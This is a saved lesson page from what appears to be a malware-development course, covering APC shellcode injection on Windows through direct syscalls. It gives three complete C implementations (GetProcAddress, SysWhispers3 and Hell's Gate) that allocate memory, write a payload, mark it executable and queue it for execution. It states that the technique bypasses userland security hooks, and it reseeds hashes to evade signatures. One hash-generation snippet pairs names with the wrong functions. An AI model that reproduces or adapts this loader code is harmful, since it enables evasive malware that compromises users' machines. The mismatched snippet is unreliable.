<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20APC%20Injection_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20APC%20Injection_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Syscalls%20-%20Reimplementing%20APC%20Injection_files/css2.css" rel="stylesheet">
        <link href="Syscalls%20-%20Reimplementing%20APC%20Injection_files/css2_002.css" rel="stylesheet">
        <title>Syscalls - Reimplementing APC Injection</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Syscalls%20-%20Reimplementing%20APC%20Injection_files/app.fdbb573b.css"><link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20APC%20Injection_files/app.fdbb573b.css"><link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20APC%20Injection_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 69 - Syscalls - Reimplementing APC Injection
            </div>
            <div class="ml-2 w-4 h-4 bg-orange-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/SyscallsApcInjection" target="_blank">
                    <img src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Syscalls - Reimplementing APC Injection</h2>
<h3>Introduction</h3>
<p>This module implements the APC Injection technique using direct 
syscalls, replacing WinAPIs with their syscall equivalent. Memory 
allocation and writing the payload will be done using <code>NtAllocateVirtualMemory</code>, <code>NtProtectVirtualMemory</code> and <code>NtWriteVirtualMemory</code> which were already discussed in the reimplementation of classic injection. The remaining syscall that will be explained is <code>NtQueueApcThread</code>.</p>
<ul>
<li>
<code>QueueUserAPC</code> is replaced with <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtQueueApcThread.html" target="_blank">NtQueueApcThread</a>
</li>
</ul>
<h4>NtQueueApcThread</h4>
<p>This is the resulting syscall from the <code>QueueUserAPC</code> WinAPI. <code>NtQueueApcThread</code> is shown below.</p>
<pre><code>NTSTATUS NtQueueApcThread(
  IN HANDLE               ThreadHandle,                 // A handle to the thread to run the specified APC
  IN PIO_APC_ROUTINE      ApcRoutine,                   // Pointer to the application-supplied APC function to be executed
  IN PVOID                ApcRoutineContext OPTIONAL,   // Pointer to a parameter (1) for the APC (set to NULL)
  IN PIO_STATUS_BLOCK     ApcStatusBlock OPTIONAL,      // Pointer to a parameter (2) for the APC (set to NULL)
  IN ULONG                ApcReserved OPTIONAL          // Pointer to a parameter (3) for the APC (set to NULL)
);
</code></pre>
<p>The first two parameters are self-explanatory. The remaining three, <code>ApcRoutineContext</code>, <code>ApcStatusBlock</code> and <code>ApcReserved</code> are used as parameters for the APC function, <code>ApcRoutine</code>.</p>
<h3>Creating An Alertable Thread</h3>
<p>Since the APC Injection technique requires a thread in an alertable state, this will be provided using the <code>CreateThread</code> WinAPI. The <code>AlterableFunction</code> function will be called by the sacrificial thread.</p>
<pre><code>VOID AlterableFunction() {

  HANDLE	hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	
  MsgWaitForMultipleObjectsEx(
		1,
		&amp;hEvent,
		INFINITE,
		QS_HOTKEY,
		MWMO_ALERTABLE
	);

}
</code></pre>
<h3>Implementation Using GetProcAddress and GetModuleHandle</h3>
<p>A <code>Syscall</code> structure is created and initialized using <code>InitializeSyscallStruct</code>, which holds the addresses of the syscalls used, as shown below.</p>
<pre><code>
// A structure used to keep the syscalls used
typedef struct _Syscall {

	fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
	fnNtProtectVirtualMemory  pNtProtectVirtualMemory;
	fnNtWriteVirtualMemory    pNtWriteVirtualMemory;
	fnNtQueueApcThread        pNtQueueApcThread;

}Syscall, * PSyscall;


// Function used to populate the input 'St' structure
BOOL InitializeSyscallStruct(OUT PSyscall St) {

	HMODULE hNtdll =  GetModuleHandle(L"NTDLL.DLL");
	if (!hNtdll) {
		printf("[!] GetModuleHandle Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	St-&gt;pNtAllocateVirtualMemory  = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	St-&gt;pNtProtectVirtualMemory   = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	St-&gt;pNtWriteVirtualMemory     = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	St-&gt;pNtQueueApcThread         = (fnNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");

    // check if GetProcAddress missed a syscall 
	if (St-&gt;pNtAllocateVirtualMemory == NULL || St-&gt;pNtProtectVirtualMemory == NULL || St-&gt;pNtWriteVirtualMemory == NULL || St-&gt;pNtQueueApcThread == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre>
<p>Next, the <code>ApcInjectionViaSyscalls</code> function will be responsible for allocating, writing and executing the payload, <code>pPayload</code>, in the target process, <code>hProcess</code>. It will use the sacrificial thread's handle, <code>hThread</code>. The function returns <code>FALSE</code> if it fails to execute the payload and <code>TRUE</code> if it succeeds.</p>
<pre><code>BOOL ApcInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	Syscall     St                      = { 0 };
	NTSTATUS    STATUS                  = NULL;
	PVOID       pAddress                = NULL;
	ULONG       uOldProtection          = NULL;
	SIZE_T      sSize                   = sPayloadSize,
	            sNumberOfBytesWritten   = NULL;

	// Initializing the 'St' structure to fetch the syscall's addresses
	if (!InitializeSyscallStruct(&amp;St)) {
		printf("[!] Could Not Initialize The Syscall Struct \n");
		return FALSE;
	}


	// Allocating memory 
	if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sSize);

//--------------------------------------------------------------------------
	
	// Writing the payload
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();
	printf("\t[i] Writing Payload Of Size %d ... ", sPayloadSize);
	if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf("[+] DONE \n");

//--------------------------------------------------------------------------

	// Changing the memory's permissions to RWX
	if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

//--------------------------------------------------------------------------

	// Executing the payload via NtQueueApcThread

	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... ", pAddress, GetThreadId(hThread));
	if ((STATUS = St.pNtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
		printf("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");

	return TRUE;
}
</code></pre>
<h3>Implementation Using SysWhispers</h3>
<p>The implementation here uses SysWhispers3 to bypass userland hooks 
via direct syscalls. The following command is used to generate the 
required files for this implementation.</p>
<pre><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtQueueApcThread -o SysWhispers -v
</code></pre>
<p>Three files are generated: <code>SysWhispers.h</code>, <code>SysWhispers.c</code> and <code>SysWhispers-asm.x64.asm</code>. The next step is to import these files into Visual Studio as demonstrated previously. <code>ApcInjectionViaSyscalls</code> is shown below.</p>
<pre><code>BOOL ApcInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	Syscall     St                      = { 0 };
	NTSTATUS    STATUS                  = NULL;
	PVOID       pAddress                = NULL;
	ULONG       uOldProtection          = NULL;
	SIZE_T      sSize                   = sPayloadSize,
	            sNumberOfBytesWritten   = NULL;

	// Allocating memory 
	if ((STATUS = NtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sSize);

//--------------------------------------------------------------------------
	
	// Writing the payload
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();
	printf("\t[i] Writing Payload Of Size %d ... ", sPayloadSize);
	if ((STATUS = NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf("[+] DONE \n");


//--------------------------------------------------------------------------

	// Changing the memory's permissions to RWX
	if ((STATUS = NtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

//--------------------------------------------------------------------------

	// Executing the payload via NtQueueApcThread

	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... ", pAddress, GetThreadId(hThread));
	if ((STATUS = NtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
		printf("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");

	return TRUE;
}
</code></pre>
<h3>Implementation Using Hell's Gate</h3>
<p>The last implementation for this module is using Hell's Gate. First, 
ensure that the same steps done to set up the Visual Studio project with
 SysWhispers3 are done here too. Specifically, enabling MASM and 
modifying the properties to set the ASM file to be compiled using the 
Microsoft Macro Assembler.</p>
<h4>Updating The VX_TABLE Structure</h4>
<pre><code>typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtWriteVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtQueueApcThread;
} VX_TABLE, * PVX_TABLE;
</code></pre>
<h4>Updating Seed Value</h4>
<p>A new seed value will be used to replace the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93" target="_blank">old one</a> to change the hash values of the syscalls. The djb2 hashing function is updated with the new seed value below.</p>
<pre><code>DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x77347734DEADBEEF; // Old value: 0x7734773477347734
	INT c;

	while (c = *str++)
		dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

	return dwHash;
}
</code></pre>
<p>The following <code>printf</code> statements should be added to a new project to generate the djb2 hash values.</p>
<pre><code>printf("#define %s%s 0x%p \n", "NtAllocateVirtualMemory", "_djb2", (DWORD64)djb2("NtCreateSection"));
printf("#define %s%s 0x%p \n", "NtWriteVirtualMemory", "_djb2", djb2("NtMapViewOfSection"));
printf("#define %s%s 0x%p \n", "NtProtectVirtualMemory", "_djb2", djb2("NtUnmapViewOfSection"));
printf("#define %s%s 0x%p \n", "NtQueueApcThread", "_djb2", djb2("NtClose"));
printf("#define %s%s 0x%p \n", "NtCreateThreadEx", "_djb2", djb2("NtCreateThreadEx"));
</code></pre>
<p>Once the values are generated, add them to the start of the Hell's Gate project.</p>
<pre><code>#define NtAllocateVirtualMemory_djb2 0x7B2D1D431C81F5F6
#define NtWriteVirtualMemory_djb2    0x54AEE238645CCA7C
#define NtProtectVirtualMemory_djb2  0xA0DCC2851566E832
#define NtQueueApcThread_djb2        0x331E6B6B7E696022
</code></pre>
<h4>Updating The Main Function</h4>
<p>The main function must be updated to use the <code>ApcInjectionViaSyscalls</code> function instead of the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank">payload function</a>. The function will use the above-generated hashes as shown below.</p>
<pre><code>
BOOL ApcInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	Syscall     St                      = { 0 };
	NTSTATUS    STATUS                  = NULL;
	PVOID       pAddress                = NULL;
	ULONG       uOldProtection          = NULL;
	SIZE_T      sSize                   = sPayloadSize,
	            sNumberOfBytesWritten   = NULL;

	// Allocating memory 
	HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sSize);

//--------------------------------------------------------------------------
	
	// Writing the payload
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();
	printf("\t[i] Writing Payload Of Size %d ... ", sPayloadSize);
	HellsGate(pVxTable-&gt;NtWriteVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
		printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}
	printf("[+] DONE \n");

//--------------------------------------------------------------------------

	// Changing the memory's permissions to RWX
	HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
	if ((STATUS = HellDescent(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

//--------------------------------------------------------------------------

	// Executing the payload via NtQueueApcThread

	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... ", pAddress, GetThreadId(hThread));
	HellsGate(pVxTable-&gt;NtQueueApcThread.wSystemCall);
	if ((STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL)) != 0) {
		printf("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");


	return TRUE;
}
</code></pre>
<br>
<h3>Remote Injection</h3>
<p>It's possible to use the <code>ApcInjectionViaSyscalls</code> function for remote process injection but to do so a suspended process must be created. This approach was discussed in the <em>Early Bird APC Queue Code Injection</em> module.</p>
<h3>Demo</h3>
<p>Using SysWhispers implementation.</p>
<p><img src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/syscall-apc-114387928-a6054f8c-8590-49cb-a97e-6eb4d7e2870e.png" alt="image"></p>
<p>Using Hell's Gate implementation.</p>
<p><img src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/syscall-apc-214388088-5de280c3-8fd2-4546-9127-c058c373757b.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Implement APC injection using SysWhispers and Hell's Gate</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Learn the usage and parameters of the NtQueueApcThread syscall</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Create a suspended process and perform process injection with syscalls then execute the payload using NtQueueApcThread</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/68"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/69/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/69/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/70"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/jquery-3.6.0.min.js"></script>
        <script src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Syscalls%20-%20Reimplementing%20APC%20Injection_files/app.4474f4d1.css"><link rel="modulepreload" href="Syscalls%20-%20Reimplementing%20APC%20Injection_files/app.5f3af5ce.js"><link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20APC%20Injection_files/app.4474f4d1.css"><script type="module" src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/app.5f3af5ce.js"></script><script src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/navbar.js"></script>
<script src="Syscalls%20-%20Reimplementing%20APC%20Injection_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 69;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>